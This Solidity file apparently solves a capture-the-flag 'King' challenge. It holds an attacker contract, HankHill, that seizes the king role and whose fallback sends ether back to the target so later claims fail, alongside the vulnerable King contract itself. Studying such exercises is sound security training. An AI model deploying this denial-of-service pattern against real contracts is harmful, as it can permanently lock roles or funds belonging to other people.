// somehow make the king a nonpayable contract; forces msg.sender 
// to be a nonpayable, then when you submit, it fails before it can 
// set the king to msg.sender
pragma solidity ^0.8.0;

contract HankHill {
    address payable targetAddress;
    King target;
    address payable player;

    constructor(address _targetAddress, address _player) {
        targetAddress = payable(_targetAddress);
        player = payable(_player);
        target = King(targetAddress);
    }

    function calcPrize() internal view returns (uint256 prize) {
        return target.prize();
    }

    function claimKing() external payable returns(bool) {
        require(address(this).balance > 0, "Dont forget to send me gas money");
        uint256 prize = calcPrize();
        (bool succ, bytes memory response) = targetAddress.call{value: msg.value}("");
        if (succ) {
          return true;
        } else {
          return false;
        }
    }

    fallback() external payable {
        uint256 prizeAmount = target.prize();
        (bool succ, bytes memory response) = targetAddress.call{
          value: prizeAmount
        }("");
    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

//EOA is tx.origin, HankHill is msg.sender
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}